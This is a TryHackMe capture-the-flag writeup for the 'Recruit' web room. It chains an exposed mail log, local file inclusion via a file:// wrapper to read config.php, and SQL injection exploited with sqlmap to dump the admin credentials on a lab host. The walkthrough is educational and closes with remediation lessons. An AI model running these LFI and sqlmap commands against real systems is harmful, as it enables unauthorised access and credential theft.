Written By Aryan Giri

# Recruit — TryHackMe Writeup

## Room Information

**Room:** Recruit
**Difficulty:** Easy
**Category:** Web Security

---

## Objective

Recruit has launched a new recruitment portal that allows HR staff to manage candidate applications while administrators oversee hiring decisions.

Our goal is to assess the application from an attacker's perspective, identify exposed functionality, exploit vulnerabilities, gain an initial foothold, escalate privileges, and ultimately log in as the administrator.

---

# Initial Enumeration

The target application is available at:

```text
http://10.49.139.46/
```

Upon visiting the website, we are presented with a login page.

<img width="1587" height="583" alt="Screenshot 2026-06-28 200323" src="https://github.com/user-attachments/assets/ee302cde-d341-423c-9a61-9e02c60f1c42" />

Rather than immediately attempting authentication, begin enumerating every piece of publicly accessible functionality.

---

# Discovering the API Documentation

On the login page there is an **API** link.

Clicking it redirects us to the API documentation.

<img width="831" height="434" alt="Screenshot 2026-06-28 210742" src="https://github.com/user-attachments/assets/19f87c79-7439-4b10-8d21-0fd466b4a253" />


The documentation exposes an interesting endpoint:

```text
/file.php?cv=<URL>
```

The documentation explains that this endpoint can fetch a candidate CV.

Although it appears harmless, it is worth noting because endpoints accepting file paths or URLs often become attack surfaces.

Keep this endpoint in mind.

---

# Web Enumeration

Since we currently do not know any usernames or passwords, perform basic web enumeration.

Running Nmap's vulnerability scripts:

```bash
nmap --script vuln 10.49.139.46 -p80
```

Output:

```text
PORT   STATE SERVICE
80/tcp open  http

| http-cookie-flags:
|   PHPSESSID:
|_      httponly flag not set

| http-enum:
|   /mail/: Mail folder
|_  /phpmyadmin/: phpMyAdmin

| http-fileupload-exploiter:
|_    Couldn't find a file-type field.

|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

Although no critical vulnerability is discovered automatically, Nmap reveals two interesting directories:

* `/phpmyadmin/`
* `/mail/`

The room objective doesn't involve phpMyAdmin, so we will ignore it for now.

The `/mail/` directory looks much more interesting.

---

# Inspecting the Mail Directory

Browse to:

```text
http://10.49.139.46/mail/
```

A `mail.log` file is present.

<img width="647" height="434" alt="Screenshot 2026-06-28 201853" src="https://github.com/user-attachments/assets/3aa963b0-4ff0-42a7-b3a0-5866f10c94ac" />


Opening the file reveals an internal email:

```text
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

We've completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:

- HR login credentials (username: **hr**) are currently stored in the application
  configuration file (**config.php**) for ease of access during
  the initial rollout phase.

- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.
```

Two extremely valuable pieces of information are leaked:

* **Username:** `hr`
* **Password Location:** `config.php`

This immediately reminds us of the endpoint discovered earlier:

```text
/file.php?cv=<URL>
```

---

# Exploiting Local File Inclusion

Attempting to retrieve the configuration file directly:

```bash
curl http://10.49.139.46/file.php?cv=config.php
```

Response:

```text
Only local files are allowed
```

This tells us that the endpoint is attempting to restrict remote resources.

However, the application accepts local file wrappers.

Using the `file://` wrapper:

```bash
curl http://10.49.139.46/file.php?cv=file://config.php
```

Response:

```php
$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';

...

$HR_PASSWORD = '**hrpassword123**';
```

The Local File Inclusion vulnerability successfully exposes the application configuration.

We now have:

| Username | Password          |
| -------- | ----------------- |
| hr       | **hrpassword123** |

---

# Initial Access

Using the recovered credentials:

```text
Username: hr
Password: hrpassword123
```

we can successfully authenticate as the HR user.

After login, the HR dashboard becomes accessible.

<img width="1571" height="655" alt="Screenshot 2026-06-28 203549" src="https://github.com/user-attachments/assets/0d774db7-d7d0-47c0-9ebe-abf1181296d4" />


The room provides the first flag here (hidden in screenshots to comply with TryHackMe policies).

---

# Looking for Privilege Escalation

Our objective is now to become the administrator.

Exploring the dashboard reveals:

* Candidate listing
* Search functionality

Initially, several possibilities were tested:

* IDOR
* Cookie manipulation
* Parameter tampering

None produced useful results.

Next, test the search field for SQL Injection by entering:

```text
'
```
<img width="1434" height="202" alt="Screenshot 2026-06-28 203857" src="https://github.com/user-attachments/assets/78fedec4-a324-4760-904d-62ad21955556" />

Instead of a normal response, the application returns an SQL error.

This is a strong indication that user input is reaching the database without proper sanitization.

---

# Exploiting SQL Injection

This vulnerability can be exploited manually or automatically.

For this room, SQLMap is significantly faster.

---

## Capturing the Request

Instead of manually copying cookies into SQLMap using `--cookie`, we can simply use the `-r` option.

### Configure Firefox

If Burp Suite is not already configured:

1. Open Firefox Settings
2. Search for **Proxy**
3. Open **Network Settings**
4. Select **Manual Proxy Configuration**
5. Set:

```
HTTP Proxy:
127.0.0.1

Port:
8080
```

This forwards browser traffic through Burp Suite.

---

## Save the Request

Search for any value (for example `1`) inside the application's search box.

The request appears inside Burp.

Navigate to:

```
Proxy
→ HTTP History
```

Right-click the request:

```
Save Item
```

Save it as:

```text
req
```

<img width="773" height="641" alt="Screenshot 2026-06-28 204940" src="https://github.com/user-attachments/assets/e217bf37-52f8-4768-8a4b-882d90ac383f" />


---

# Enumerating Databases

Run:

```bash
sqlmap -r req --dbs
```

Result:

```text
available databases

information_schema
mysql
performance_schema
phpmyadmin
recruit_db
sys
```

Earlier, the leaked email mentioned that administrator credentials are stored inside the backend database.

The most relevant database is:

```text
recruit_db
```

---

# Enumerating Tables

```bash
sqlmap -r req -D recruit_db --tables
```

Output:

```text
+------------+
| candidates |
| users      |
+------------+
```

The `users` table is the obvious target.

---

# Enumerating Columns

```bash
sqlmap -r req -D recruit_db -T users --columns
```

Output:

```text
+----------+--------------+
| id       | int          |
| password | varchar(100) |
| username | varchar(50)  |
+----------+--------------+
```

---

# Dumping Credentials

Dump users:

```bash
sqlmap -r req -D recruit_db -T users --dump
```

Result:

```text
+----------+
| username |
+----------+
| admin    |
+----------+

```

Dump password :

```bash
sqlmap -r req -D recruit_db -T users -C password --dump
```

Result:
```bash
+----------------+
| password       |
+----------------+
| admin@001admin |
+----------------+
```

Administrator credentials recovered:

```text
Username: admin
Password: admin@001admin
```

---

# Administrator Access

Authenticate using the recovered credentials.

```text
Username: admin
Password: admin@001admin
```

The administrator dashboard is now accessible.

The final flag is displayed after successful login.

<img width="1565" height="648" alt="Screenshot 2026-06-28 210122" src="https://github.com/user-attachments/assets/f4463903-9a8f-4de9-b2f3-fe5c7974ff81" />


---

# Attack Chain Summary

```text
Anonymous User
        │
        ▼
API Documentation Disclosure
        │
        ▼
Discover /file.php?cv=<URL>
        │
        ▼
Directory Enumeration
        │
        ▼
Expose mail.log
        │
        ▼
Leak username (hr)
Leak password location (config.php)
        │
        ▼
LFI using file:// wrapper
        │
        ▼
Read config.php
        │
        ▼
Recover HR Password
        │
        ▼
Login as HR
        │
        ▼
SQL Injection in Search
        │
        ▼
SQLMap Enumeration
        │
        ▼
Dump users Table
        │
        ▼
Recover Admin Credentials
        │
        ▼
Login as Administrator
```

# Vulnerabilities Identified

| Vulnerability                  | Impact                                                    |
| ------------------------------ | --------------------------------------------------------- |
| Information Disclosure         | API documentation exposes internal functionality          |
| Directory Enumeration          | Exposed mail directory leaks sensitive operational emails |
| Local File Inclusion (LFI)     | Reads application configuration and secrets               |
| Hardcoded Credentials          | HR password stored inside configuration file              |
| SQL Injection                  | Database enumeration and credential extraction            |
| Excessive Information Exposure | Internal deployment information aids attackers            |

# Lessons Learned

* Never expose internal deployment emails through publicly accessible directories.
* Configuration files should never contain plaintext credentials.
* File retrieval endpoints must strictly validate file paths and reject dangerous wrappers such as `file://`.
* Parameterized queries should be used to prevent SQL Injection.
* Public API documentation should avoid exposing implementation details that assist attackers.
